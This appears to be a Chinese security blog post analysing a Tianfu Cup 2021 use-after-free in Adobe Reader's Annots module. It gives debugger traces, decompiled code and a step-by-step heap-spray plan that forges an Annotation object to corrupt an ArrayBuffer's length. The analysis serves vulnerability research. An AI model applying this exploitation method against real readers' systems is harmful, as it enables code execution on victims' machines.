@@ -1,0 +1,557 @@
+I"�i<h1 id="前言">前言</h1>
+
+<p>该漏洞为2021年天府杯中使用的Adobe Reader UAF漏洞，漏洞位于<code class="language-plaintext highlighter-rouge">Annots.api</code>模块，对应的Adobe Reader版本为：21.007.20099。<!--more--></p>
+
+<h1 id="原理分析">原理分析</h1>
+
+<p>开启pageheap后，打开POC，崩溃于<code class="language-plaintext highlighter-rouge">Annots+6aabb</code>处：</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>0:000&gt; g
+(18b8.136c): Access violation - code c0000005 (first chance)
+First chance exceptions are reported before any exception handling.
+This exception may be expected and handled.
+eax=04afc5fc ebx=4ac2cffc ecx=567e8fa0 edx=04afc574 esi=57536ff4 edi=567e8fa0
+eip=6c55aabb esp=04afc5e8 ebp=04afc608 iopl=0         nv up ei pl nz na po nc
+cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00010202
+Annots!PlugInMain+0x4cc8b:
+6c55aabb 8b772c          mov     esi,dword ptr [edi+2Ch] ds:002b:567e8fcc=????????
+0:000&gt; k
+ # ChildEBP RetAddr  
+WARNING: Stack unwind information not available. Following frames may be wrong.
+00 04afc608 6c5bebd8 Annots!PlugInMain+0x4cc8b
+01 04afc640 6c5bc872 Annots!PlugInMain+0xb0da8
+02 04afc714 6c5bed43 Annots!PlugInMain+0xaea42
+03 04afc72c 6cdf3f47 Annots!PlugInMain+0xb0f13
+04 04afc870 6cdd86ff EScript!mozilla::HashBytes+0x421f7
+05 04afc8e4 6cdd3495 EScript!mozilla::HashBytes+0x269af
+06 04afcd50 6cdd23eb EScript!mozilla::HashBytes+0x21745
+07 04afcd94 6cdd22fb EScript!mozilla::HashBytes+0x2069b
+08 04afcdd0 6cdd2230 EScript!mozilla::HashBytes+0x205ab
+09 04afce04 6cdbb630 EScript!mozilla::HashBytes+0x204e0
+0a 04afce54 6cdfa956 EScript!mozilla::HashBytes+0x98e0
+0b 04afced8 6cdfa65b EScript!mozilla::HashBytes+0x48c06
+0c 04afd08c 6cdf9fd6 EScript!mozilla::HashBytes+0x4890b
+0d 04afd0d8 6cdf8db3 EScript!mozilla::HashBytes+0x48286
+0e 04afd178 6ce76ebf EScript!mozilla::HashBytes+0x47063
+......
+</code></pre></div></div>
+
+<p>查看该函数可以明显看到由于this指针指向了非法地址导致：</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>_DWORD *__thiscall sub_2216AAAD(int this)
+{
+  _DWORD *v2; // esi
+
+  v2 = *(_DWORD **)(this + 0x2C);	//crash		
+  if ( !v2 )
+  {
+    v2 = (_DWORD *)alloc_0((wchar_t *)this, 0xC, 1);
+    if ( v2 )
+    {
+      *v2 = 0;
+      v2[1] = 0;
+      *v2 = sub_221234C9(v2);		// 初始化v2
+    }
+    else
+    {
+      v2 = 0;
+    }
+    *(_DWORD *)(this + 0x2C) = v2;
+  }
+  return v2;
+}
+</code></pre></div></div>
+
+<p>于是向上回溯找到了漏洞函数<code class="language-plaintext highlighter-rouge">Annots+CC5EA</code>，该函数获取了指向非法地址的this指针：</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>__int16 __thiscall sub_221CC5EA(void *this, wchar_t *a2, wchar_t *a3, int a4)
+{
+  v19[2] = (uintptr_t)this;
+  v24 = (wchar_t *)a4;
+  v27 = a3;
+  v4 = (wchar_t *)(*(int (__cdecl **)(wchar_t *))(vtable + 0xF4))(a3);// v4 = *a3
+  v26 = (wchar_t *)0xFFFFFFFF;
+......	//省略无关函数
+  if ( (int)v26 &gt;= 0 )
+    sub_2226B498((void *)dword_22748BEC, v6, v26, (int)&amp;object, v28, v30 != 0, v29);// 获取Annotation对象，存储于object
+  else
+    sub_221599FC((char)v6, &amp;object, v28, v30 != 0, v29);
+  if ( (unsigned int)((char *)object_end - (char *)object) &lt; 4 )
+  {
+    (*(void (__cdecl **)(wchar_t *, _DWORD))(vtable + 0x80))(v24, 0);
+  }
+  else
+  {
+    addr = (wchar_t *)(*(int (__cdecl **)(unsigned int))(dword_22747444 + 4))(((char *)object_end - (char *)object) &amp; 0xFFFFFFFC);	// malloc object size
+    v10 = (int *)object;
+    v11 = addr;
+    v12 = object_end;
+    v27 = addr;
+    if ( object != object_end )
+    {
+      do
+      {
+        v13 = vtable;
+        v14 = sub_221CEBB7(v25, *v10, 0);       // 崩溃函数的上层函数，v10存储的正是this指针
+        *(_DWORD *)v11 = (*(int (__thiscall **)(_DWORD, wchar_t *, int, int))(v13 + 0x40))(
+                           *(_DWORD *)(v13 + 0x40),
+                           v25,
+                           1,
+                           v14);
+        ++v10;
+        v12 = object_end;
+        v11 += 2;
+      }
+      while ( v10 != (int *)object_end );
+      v10 = (int *)object;
+      v11 = v27;
+    }
+......	//省略无关函数
+}
+</code></pre></div></div>
+
+<p>在调试器中可以更清晰的看到该函数通过<code class="language-plaintext highlighter-rouge">sub_2226B498</code>获取Annotation对象的过程：</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>0:000&gt; g
+Breakpoint 1 hit
+eax=0536d704 ebx=2c916bd0 ecx=2bea8ef0 edx=00104004 esi=00000000 edi=57d4afb8
+eip=6e9cc80e esp=0536d6cc ebp=0536d7a4 iopl=0         nv up ei pl zr na pe nc
+cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00000246
+Annots!PlugInMain+0xae9de:
+6e9cc80e e885ec0900      call    Annots!PlugInMain+0x14d668 (6ea6b498)	//获取Annotation对象
+0:000&gt; dps esp L6
+0536d6cc  2c916bd0
+0536d6d0  00000000
+0536d6d4  0536d704		//该处存放获取的Annotation对象
+0536d6d8  00000000
+0536d6dc  00000000
+0536d6e0  00000008
+0:000&gt; dd 0536d704 L4	//未获取前为空
+0536d704  00000000 00000000 00000000 3b2c7800
+0:000&gt; p
+eax=00000002 ebx=2c916bd0 ecx=6ea6b691 edx=00000003 esi=00000000 edi=57d4afb8
+eip=6e9cc813 esp=0536d6e4 ebp=0536d7a4 iopl=0         nv up ei pl zr na pe nc
+cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00000246
+Annots!PlugInMain+0xae9e3:
+6e9cc813 8b8564ffffff    mov     eax,dword ptr [ebp-9Ch] ss:002b:0536d708=6b5c4ff8
+0:000&gt; dd 0536d704 L4	//获取到0xC大小的存放Annotation对象指针的结构
+0536d704  6b5c4ff0 6b5c4ff8 6b5c5000 3b2c7800
+0:000&gt; dd 6b5c4ff0 L4	//该结构存放了两个Annotation对象
+6b5c4ff0  809b4fa0 64cfafa0 00000000 00000000
+0:000&gt; dd 809b4fa0 L18	//Annots[0]，name:aaa
+809b4fa0  6ee3616c 00000000 00000000 00000001
+809b4fb0  00000000 83f6efb0 69bc8ff8 69bc8ff8
+809b4fc0  69bc8ffc 00000000 00000000 83dd4ff0
+809b4fd0  00000000 00000000 00000000 00000000
+809b4fe0  00000000 00000000 00000000 00000000
+809b4ff0  00000000 00000000 00000000 00000000
+0:000&gt; dd 64cfafa0 L18	//Annots[1]，name:bbb
+64cfafa0  6ee3616c 00000000 00000000 00000001
+64cfafb0  00000000 8034cfb0 80d48ff8 80d48ffc
+64cfafc0  80d48ffc 00000000 00000000 8bdc0ff0
+64cfafd0  00000000 00000000 00000000 00000000
+64cfafe0  00000000 00000000 00000000 00000000
+64cfaff0  00000000 00000000 00000000 00000000
+</code></pre></div></div>
+
+<p>每个Annotation对象的大小均为0x60，随后将Annots[0]对象的指针传入<code class="language-plaintext highlighter-rouge">sub_221CEBB7</code>：</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>0:000&gt; g
+Breakpoint 2 hit
+eax=85de8ff8 ebx=85de8ff8 ecx=55ae2ff8 edx=01000002 esi=6b5c4ff0 edi=24d74c98
+eip=6e9cc86d esp=0536d6d8 ebp=0536d7a4 iopl=0         nv up ei ng nz ac po cy
+cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00000293
+Annots!PlugInMain+0xaea3d:
+6e9cc86d e845230000      call    Annots!PlugInMain+0xb0d87 (6e9cebb7)	//sub_221CEBB7，崩溃函数的上层函数
+0:000&gt; dps esp L3
+0536d6d8  2f8e8fc0
+0536d6dc  809b4fa0		//此时传入的参数正是Annots[0]对象的指针
+0536d6e0  00000000
+</code></pre></div></div>
+
+<p>继续分析<code class="language-plaintext highlighter-rouge">sub_221CEBB7</code>，第一个函数<code class="language-plaintext highlighter-rouge">sub_2216AAAD</code>正是崩溃函数，获取了Annotation+0x2C位置的值：</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>int __stdcall sub_221CEBB7(wchar_t *a1, int object_0, int a3)
+{
+  int *v4; // esi
+  __int16 v5; // cx
+  int v6; // eax
+  int v7; // esi
+  int v8; // edi
+  _DWORD *v9; // eax
+  _DWORD *v10; // eax
+  char v11[8]; // [esp+10h] [ebp-20h] BYREF
+  _DWORD *v12; // [esp+18h] [ebp-18h]
+  int v13; // [esp+1Ch] [ebp-14h] BYREF
+  __int16 v14[5]; // [esp+22h] [ebp-Eh] BYREF
+  int v15; // [esp+2Ch] [ebp-4h]
+
+  if ( !object_0 )
+    return 0;
+  v4 = sub_2216AAAD(object_0);                  // 获取Annotation+0X2C，崩溃函数
+  if ( word_2273055C == (__int16)0xFFFF )
+    v5 = sub_22123B90(&amp;word_2273055C);
+  else
+    v5 = word_2273055C;
+  v14[0] = v5;
+  v6 = updateobj(v4, (int)v11, (unsigned __int16 *)v14);
+  v7 = 0;
+  v8 = *(_DWORD *)(*(_DWORD *)v6 + 0x14);
+  v13 = v8;
+  if ( v8 )
+    goto LABEL_10;
+  v9 = (_DWORD *)alloc_0(0xC, 1);
+  v12 = v9;
+  v15 = 0;
+  if ( v9 )
+  {
+    v10 = sub_221CA131(v9, a1, object_0, (int)&amp;v13);// markup
+    v8 = v13;
+    v7 = (int)v10;
+  }
+  v15 = 0xFFFFFFFF;
+  if ( v8 )
+  {
+LABEL_10:
+    if ( !v7 )
+      v7 = (*(int (__cdecl **)(int, const wchar_t *))(vtable + 0xCC))(v8, "this");
+  }
+  if ( a3 )
+    *(_DWORD *)a3 = v7;
+  return v8;
+}
+</code></pre></div></div>
+
+<p>在调试器中执行到该函数，传入的参数为Annots[0]对象的指针，因此能够正确获取到Annotation+0x2C的值并返回：</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>0:000&gt; 
+eax=0536d6c4 ebx=85de8ff8 ecx=809b4fa0 edx=01000002 esi=6b5c4ff0 edi=24d74c98
+eip=6e9cebd3 esp=0536d6a0 ebp=0536d6d0 iopl=0         nv up ei ng nz na pe nc
+cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00000286
+Annots!PlugInMain+0xb0da3:
+6e9cebd3 e8d5bef9ff      call    Annots!PlugInMain+0x4cc7d (6e96aaad)
+0:000&gt; dd ecx L18
+809b4fa0  6ee3616c 00000000 00000000 00000001
+809b4fb0  00000000 83f6efb0 69bc8ff8 69bc8ff8
+809b4fc0  69bc8ffc 00000000 00000000 83dd4ff0
+809b4fd0  00000000 00000000 00000000 00000000
+809b4fe0  00000000 00000000 00000000 00000000
+809b4ff0  00000000 00000000 00000000 00000000
+0:000&gt; p
+eax=83dd4ff0 ebx=85de8ff8 ecx=6e96aaf7 edx=01000002 esi=6b5c4ff0 edi=24d74c98
+eip=6e9cebd8 esp=0536d6a0 ebp=0536d6d0 iopl=0         nv up ei ng nz na pe nc
+cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00000286
+Annots!PlugInMain+0xb0da8:
+6e9cebd8 668b0d5c05f36e  mov     cx,word ptr [Annots!PlugInMain+0x61272c (6ef3055c)] ds:002b:6ef3055c=14c8
+0:000&gt; dd 83dd4ff0 L4	//获取到Annotation+0x2C处的值
+83dd4ff0  86ed0fe8 00000000 00000000 d0d0d0d0
+</code></pre></div></div>
+
+<p>继续向下执行到<code class="language-plaintext highlighter-rouge">sub_221CA131</code>，该函数传入了Annots[0]对象的指针，执行完毕该函数发现Annost[1]对象被释放：</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>0:000&gt; pc
+eax=674eeff0 ebx=85de8ff8 ecx=674eeff0 edx=00000000 esi=00000000 edi=00000000
+eip=6e9cec3f esp=0536d694 ebp=0536d6d0 iopl=0         nv up ei pl nz na pe nc
+cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00000206
+Annots!PlugInMain+0xb0e0f:
+6e9cec3f e8edb4ffff      call    Annots!PlugInMain+0xac301 (6e9ca131)
+0:000&gt; dps esp L3
+0536d694  2f8e8fc0
+0536d698  809b4fa0	//Annots[0]对象的指针
+0536d69c  0536d6bc
+0:000&gt; dd 809b4fa0 L18	//Annots[0]
+809b4fa0  6ee3616c 00000000 00000000 00000001
+809b4fb0  00000000 83f6efb0 69bc8ff8 69bc8ff8
+809b4fc0  69bc8ffc 00000000 00000000 83dd4ff0
+809b4fd0  00000000 00000000 00000000 00000000
+809b4fe0  00000000 00000000 00000000 00000000
+809b4ff0  00000000 00000000 00000000 00000000
+0:000&gt; dd 64cfafa0 L18	//Annots[1]
+64cfafa0  6ee3616c 00000000 00000000 00000001
+64cfafb0  00000000 8034cfb0 80d48ff8 80d48ffc
+64cfafc0  80d48ffc 00000000 00000000 8bdc0ff0
+64cfafd0  00000000 00000000 00000000 00000000
+64cfafe0  00000000 00000000 00000000 00000000
+64cfaff0  00000000 00000000 00000000 00000000
+0:000&gt; p
+eax=674eeff0 ebx=85de8ff8 ecx=6e9ca252 edx=09d50000 esi=00000000 edi=00000000
+eip=6e9cec44 esp=0536d6a0 ebp=0536d6d0 iopl=0         nv up ei pl nz na po nc
+cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00000202
+Annots!PlugInMain+0xb0e14:
+6e9cec44 8b7dec          mov     edi,dword ptr [ebp-14h] ss:002b:0536d6bc=69c80fb8
+0:000&gt; dd 809b4fa0 L18	//Annots[0]
+809b4fa0  6ee3616c 00000000 00000000 00000001
+809b4fb0  00000000 83f6efb0 69bc8ff8 69bc8ffc
+809b4fc0  69bc8ffc 00000000 00000000 83dd4ff0
+809b4fd0  00000000 00000000 00000000 00000000
+809b4fe0  00000000 00000000 00000000 00000000
+809b4ff0  00000000 00000000 00000000 00000000
+0:000&gt; dd 64cfafa0 L18	//Annots[1]
+64cfafa0  ???????? ???????? ???????? ????????
+64cfafb0  ???????? ???????? ???????? ????????
+64cfafc0  ???????? ???????? ???????? ????????
+64cfafd0  ???????? ???????? ???????? ????????
+64cfafe0  ???????? ???????? ???????? ????????
+64cfaff0  ???????? ???????? ???????? ????????
+</code></pre></div></div>
+
+<p>返回到漏洞函数<code class="language-plaintext highlighter-rouge">sub_221CC5EA</code>，会循环执行<code class="language-plaintext highlighter-rouge">sub_221CEBB7</code>，第二次执行时则传入了Annots[1]对象的指针，而此时Annots[1]对象已经被释放。因此在获取Annots[1]+0x2C时便会出现非法访问异常：</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>0:000&gt; g
+Breakpoint 2 hit
+eax=5825aff0 ebx=85de8ffc ecx=55ae2ff8 edx=0536d604 esi=6b5c4ff4 edi=24d74c98
+eip=6e9cc86d esp=0536d6d8 ebp=0536d7a4 iopl=0         nv up ei ng nz ac pe cy
+cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00000297
+Annots!PlugInMain+0xaea3d:
+6e9cc86d e845230000      call    Annots!PlugInMain+0xb0d87 (6e9cebb7)
+0:000&gt; dps 0536d6d8 L3
+0536d6d8  2f8e8fc0
+0536d6dc  64cfafa0	//此时传入的参数为Annots[1]对象的指针
+0536d6e0  00000000
+0:000&gt; g
+(135c.14cc): Access violation - code c0000005 (first chance)
+First chance exceptions are reported before any exception handling.
+This exception may be expected and handled.
+eax=0536d68c ebx=85de8ffc ecx=64cfafa0 edx=0536d604 esi=6b5c4ff4 edi=64cfafa0
+eip=6e96aabb esp=0536d678 ebp=0536d698 iopl=0         nv up ei ng nz na pe nc
+cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00010286
+Annots!PlugInMain+0x4cc8b:
+6e96aabb 8b772c          mov     esi,dword ptr [edi+2Ch] ds:002b:64cfafcc=????????	//获取Annots[1]+0x2C时出错
+</code></pre></div></div>
+
+<p>关闭page heap后发现执行完毕<code class="language-plaintext highlighter-rouge">sub_221CA131</code>后，Annost[1]对象被container内的字符串占据，并最终崩溃于0x41414141：</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>0:000&gt; 
+eax=0cadbdd0 ebx=0ca3fe58 ecx=0cadbdd0 edx=00000000 esi=00000000 edi=00000000
+eip=6e9cec3f esp=0502d4e4 ebp=0502d520 iopl=0         nv up ei pl nz na po nc
+cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00000202
+Annots!PlugInMain+0xb0e0f:
+6e9cec3f e8edb4ffff      call    Annots!PlugInMain+0xac301 (6e9ca131)	//sub_221CA131
+0:000&gt; dd 0c8e9170 L18	//Annots[0]
+0c8e9170  6ee3616c 00000000 00000000 00000001
+0c8e9180  00000000 0ca6db78 0ca40128 0ca40128
+0c8e9190  0ca4012c 00000000 00000000 0cadb368
+0c8e91a0  00000000 00000000 00000000 00000000
+0c8e91b0  00000000 00000000 00000000 00000000
+0c8e91c0  00000000 00000000 00000000 00000000
+0:000&gt; dd 0c8e8c90 L18	//Annots[1]
+0c8e8c90  6ee3616c 00000000 00000000 00000001
+0c8e8ca0  00000000 0ca6eca8 0ca40148 0ca4014c
+0c8e8cb0  0ca4014c 00000000 00000000 0cadba40
+0c8e8cc0  00000000 00000000 00000000 00000000
+0c8e8cd0  00000000 00000000 00000000 00000000
+0c8e8ce0  00000000 00000000 00000000 00000000
+0:000&gt; p
+eax=0cadbdd0 ebx=0ca3fe58 ecx=6e9ca252 edx=05210000 esi=00000000 edi=00000000
+eip=6e9cec44 esp=0502d4f0 ebp=0502d520 iopl=0         nv up ei pl nz na po nc
+cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00000202
+Annots!PlugInMain+0xb0e14:
+6e9cec44 8b7dec          mov     edi,dword ptr [ebp-14h] ss:002b:0502d50c=0cac1d48
+0:000&gt; dd 0c8e9170 L18	//Annots[0]
+0c8e9170  6ee3616c 00000000 00000000 00000001
+0c8e9180  00000000 0ca6db78 0ca40128 0ca4012c
+0c8e9190  0ca4012c 00000000 00000000 0cadb368
+0c8e91a0  00000000 00000000 00000000 00000000
+0c8e91b0  00000000 00000000 00000000 00000000
+0c8e91c0  00000000 00000000 00000000 00000000
+0:000&gt; dd 0c8e8c90 L18	//Annots[1]
+0c8e8c90  41414141 41414141 41414141 41414141
+0c8e8ca0  41414141 41414141 41414141 41414141
+0c8e8cb0  41414141 41414141 41414141 41414141
+0c8e8cc0  41414141 41414141 41414141 41414141
+0c8e8cd0  41414141 41414141 41414141 41414141
+0c8e8ce0  41414141 41414141 41414141 00004141
+0:000&gt; g
+(c0.20): Access violation - code c0000005 (first chance)
+First chance exceptions are reported before any exception handling.
+This exception may be expected and handled.
+eax=0502d4c4 ebx=0502d512 ecx=41414141 edx=0502d454 esi=41414141 edi=41414141
+eip=6e923c60 esp=0502d4a8 ebp=0502d4a8 iopl=0         nv up ei pl nz ac po nc
+cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00010212
+Annots!PlugInMain+0x5e30:
+6e923c60 8b01            mov     eax,dword ptr [ecx]  ds:002b:41414141=????????
+</code></pre></div></div>
+
+<p>结合POC知晓了漏洞的成因：执行<code class="language-plaintext highlighter-rouge">doc.getAnnots(0)</code>时会获取page[0]上所有的Annotation对象，在获取对象时会查询对象的Markup属性。由于aaa对象在函数中被添加，且该对象的Markup属性为回调函数，因此在获取aaa对象的Markup属性时会执行该回调函数调用<code class="language-plaintext highlighter-rouge">bbb.destroy();</code>释放bbb对象。紧接着0x60大小的template字符串刚好占位被释放的bbb对象的内存，随后获取bbb对象时访问了template字符串，造成了UAF。</p>
+
+<h1 id="漏洞利用">漏洞利用</h1>
+
+<p>UAF漏洞的利用思路一般为通过占位释放的对象内存使得后续解析伪造的对象时造成特定地址越界写或内存释放，在该漏洞中寻找到的利用方式为释放指定内存地址的ArrayBuffer对象，随后通过字符串占位该对象内存修改ArrayBuffer对象的byteLength为0xFFFFFFFF。</p>
+
+<p>继续深入分析<code class="language-plaintext highlighter-rouge">sub_221CA131</code>，该函数为获取Annotation对象Markup属性的函数：</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>_DWORD *__thiscall sub_221CA131(_DWORD *this, wchar_t *a2, int obj_annot, int a4)
+{
+  int v5; // esi
+  int v6; // eax
+  int v7; // ebx
+  __int16 v8; // ax
+  int v9; // ecx
+  int *v10; // eax
+  char v12[8]; // [esp+10h] [ebp-1Ch] BYREF
+  _DWORD *v13; // [esp+18h] [ebp-14h]
+  __int16 v14[5]; // [esp+1Eh] [ebp-Eh] BYREF
+  int v15; // [esp+28h] [ebp-4h]
+
+  v13 = this;
+  *this = &amp;CAESAnnot::`vftable';
+  v5 = vtable;
+  v15 = 0;
+  v6 = sub_221D153D(a2);
+  v7 = (*(int (__cdecl **)(wchar_t *, _DWORD, _DWORD, int))(v5 + 0x98))(a2, 0, 0, v6);// 调用Markup回调函数
+  (*(void (__cdecl **)(int, const wchar_t *, _DWORD *))(vtable + 0xC8))(v7, "this", this);// 检查参数
+  (*(void (__cdecl **)(int, const wchar_t *, int (__cdecl *)(int)))(vtable + 0xC8))(// 检查参数
+    v7,
+    "getPDAnnot",
+    getPDAnnot);
+  this[1] = obj_annot;
+  sub_221249E4((int)this);                      // 释放内存
+  *(_DWORD *)a4 = v7;
+  (*(void (__cdecl **)(wchar_t *, int))(vtable + 0x1AC))(a2, v7);
+  v8 = word_2273055C;
+  if ( word_2273055C == (__int16)0xFFFF )
+    v8 = sub_22123B90(&amp;word_2273055C);
+  v9 = this[1];
+  v14[0] = v8;
+  v10 = sub_2216AAAD(v9);
+  *(_DWORD *)(*(_DWORD *)sub_221CA0A5(v10, (int)v12, (unsigned __int16 *)v14) + 0x14) = v7;
+  (*(void (__thiscall **)(_DWORD, wchar_t *, int, const wchar_t *))(vtable + 0x15C))(
+    *(_DWORD *)(vtable + 0x15C),
+    a2,
+    v7,
+    "Markup");
+  *((_WORD *)this + 4) = 1;
+  return this;
+}
+</code></pre></div></div>
+
+<p>其中<code class="language-plaintext highlighter-rouge">sub_221249E4</code>传入的参数为获取到的Annotation对象指针，内部比较了Annots[6]和Annots[7]的值，如果一致则调用free函数释放Annots[6]存储的内存：</p>
+
+<p><img src="https://blog-1257303866.cos.ap-guangzhou.myqcloud.com/img/image-20221124143936130.png" alt="" /></p>
+
+<p>分析到这里，整个利用思路就很清晰了：</p>
+
+<ol>
+  <li>堆喷0xffe8大小的ArrayBuffer对象，在0x10100048地址处稳定构造一个ArrayBuffer对象。</li>
+  <li>在0x10100048的ArrayBuffer对象中伪造一个Annotation对象，通过各种检查措施。</li>
+  <li>修改占用Annost[1]对象的字符串，使得Annost[1]+0x18处和Annost[1]+0x1C处地址为0x10100048，并将Annost[1]+0x2C指向ArrayBuffer对象中伪造的Annotation对象。</li>
+  <li>成功释放0x10100048的ArrayBuffer对象后，利用字符串占位该处内存，将byteLength修改为0xFFFFFFFF。</li>
+</ol>
+
+<p>成功构造后整个利用流程如下：</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>0:000&gt; g
+Breakpoint 1 hit
+eax=045dc264 ebx=0be38458 ecx=0c0a9058 edx=00104004 esi=00000000 edi=0d29a0a0
+eip=6352c80e esp=045dc22c ebp=045dc304 iopl=0         nv up ei pl zr na pe nc
+cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00000246
+Annots!PlugInMain+0xae9de:
+6352c80e e885ec0900      call    Annots!PlugInMain+0x14d668 (635cb498)	//sub_2226B498，获取Annotation对象
+0:000&gt; dps esp L3
+045dc22c  0be38458
+045dc230  00000000
+045dc234  045dc264
+0:000&gt; dd 045dc264 L4
+045dc264  00000000 00000000 00000000 ffffffff
+0:000&gt; p
+eax=00000002 ebx=0be38458 ecx=635cb691 edx=00000003 esi=00000000 edi=0d29a0a0
+eip=6352c813 esp=045dc244 ebp=045dc304 iopl=0         nv up ei pl zr na pe nc
+cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00000246
+Annots!PlugInMain+0xae9e3:
+6352c813 8b8564ffffff    mov     eax,dword ptr [ebp-9Ch] ss:002b:045dc268=0c48b5a8
+0:000&gt; dd 045dc264 L4
+045dc264  0c48b5a0 0c48b5a8 0c48b5b0 ffffffff
+0:000&gt; dd 0c48b5a0 L4
+0c48b5a0  0c057f20 0c059510 00000000 00000000
+0:000&gt; dd 0c059510 L18	//Annots[1]
+0c059510  6399616c 00000000 00000000 00000001
+0c059520  00000000 0bfd56b0 0c22af20 0c22af24
+0c059530  0c22af24 00000000 00000000 0c48c968
+0c059540  00000000 00000000 00000000 00000000
+0c059550  00000000 00000000 00000000 00000000
+0c059560  00000000 00000000 00000000 00000000
+0:000&gt; g
+Breakpoint 2 hit
+eax=0e27e436 ebx=00000000 ecx=713f21b0 edx=40404040 esi=713f21b0 edi=0c48b6d8
+eip=6352a170 esp=045dc1b0 ebp=045dc1ec iopl=0         nv up ei pl zr na pe cy
+cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00000247
+Annots!PlugInMain+0xac340:
+6352a170 ffd6            call    esi {AcroRd32!AIDE::PixelPartInfo::operator=+0x174960 (713f21b0)}	//调用Markup回调函数
+0:000&gt; dd 0c059510 L18	//Annots[1]
+0c059510  6399616c 00000000 00000000 00000001
+0c059520  00000000 0bfd56b0 0c22af20 0c22af24
+0c059530  0c22af24 00000000 00000000 0c48c968
+0c059540  00000000 00000000 00000000 00000000
+0c059550  00000000 00000000 00000000 00000000
+0c059560  00000000 00000000 00000000 00000000
+0:000&gt; p
+eax=3d582e78 ebx=00000000 ecx=65b0db87 edx=65c8f74e esi=713f21b0 edi=0c48b6d8
+eip=6352a172 esp=045dc1b0 ebp=045dc1ec iopl=0         nv up ei pl nz na po nc
+cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00000202
+Annots!PlugInMain+0xac342:
+6352a172 8b0de08aaa63    mov     ecx,dword ptr [Annots!PlugInMain+0x62acb0 (63aa8ae0)] ds:002b:63aa8ae0=08490970
+0:000&gt; dd 0c059510 L18	//调用回调函数后，Annots[1]被字符串占位
+0c059510  ffff9090 ffffffff 10100048 10100048
+0c059520  10100048 10100048 10100048 10100048
+0c059530  10100048 10100058 10100058 10100058
+0c059540  10100058 10100058 10100058 10100058
+0c059550  10100058 10100058 10100058 10100058
+0c059560  10100058 10100058 10100058 00009090
+0:000&gt; 	//接着循环执行sub_221CEBB7，第二次执行到sub_221CA131函数，该函数会解析被占位的Annots[1]
+eax=6352ee70 ebx=3d582f68 ecx=0c059510 edx=63977d5f esi=70aeacf0 edi=0c48baf8
+eip=6352a1c1 esp=045dc1bc ebp=045dc1ec iopl=0         nv up ei pl nz ac pe nc
+cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00000216
+Annots!PlugInMain+0xac391:
+6352a1c1 e81ea8f5ff      call    Annots!PlugInMain+0x6bb4 (634849e4)
+0:000&gt; dd 10100048 	//ArrayBuffer对象
+10100048  00000000 0000ffe8 00000000 00000000
+10100058  10100068 00000001 00000000 00000000
+10100068  0c49af10 0c49af10 0c49af10 00000100
+10100078  00000000 00000000 00000000 00000000
+10100088  00000000 00000000 00000000 00000000
+10100098  00000000 00000000 00000000 00000000
+101000a8  00000000 00000000 00000000 00000000
+101000b8  00000000 00000000 00000000 00000000
+0:000&gt; p
+eax=0c22af70 ebx=3d582f68 ecx=0c22af70 edx=04820000 esi=70aeacf0 edi=0c48baf8
+eip=6352a1c6 esp=045dc1c0 ebp=045dc1ec iopl=0         nv up ei pl nz na po nc
+cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00000202
+Annots!PlugInMain+0xac396:
+6352a1c6 8b4510          mov     eax,dword ptr [ebp+10h] ss:002b:045dc1fc=045dc21c
+0:000&gt; dd 10100048	//解析完毕ArrayBuffer对象已经被释放
+10100048  048200c0 3d6500a0 00000000 00000000
+10100058  10100068 00000001 00000000 00000000
+10100068  0c49af10 0c49af10 0c49af10 00000100
+10100078  00000000 00000000 00000000 00000000
+10100088  00000000 00000000 00000000 00000000
+10100098  00000000 00000000 00000000 00000000
+101000a8  00000000 00000000 00000000 00000000
+101000b8  00000000 00000000 00000000 00000000
+0:000&gt; dd 10100058 L4	//此时Annots[1]+0x2C指向的伪造的Annotation对象均能通过后续的检查
+10100058  10100068 00000001 00000000 00000000
+0:000&gt; dd 10100068 L6
+10100068  0c49af10 0c49af10 0c49af10 00000100
+10100078  00000000 00000000
+//随后利用字符串对象占位被释放的ArrayBuffer对象，byteLength被修改为0xFFFFFFFF
+0:018&gt; dd 10100048
+10100048  ffff9090 ffffffff 0cb90088 00000000
+10100058  ffffffff ffffffff ffffffff ffffffff
+10100068  ffffffff ffffffff ffffffff ffffffff
+10100078  ffffffff ffffffff ffffffff ffffffff
+10100088  ffffffff ffffffff ffffffff ffffffff
+10100098  ffffffff ffffffff ffffffff ffffffff
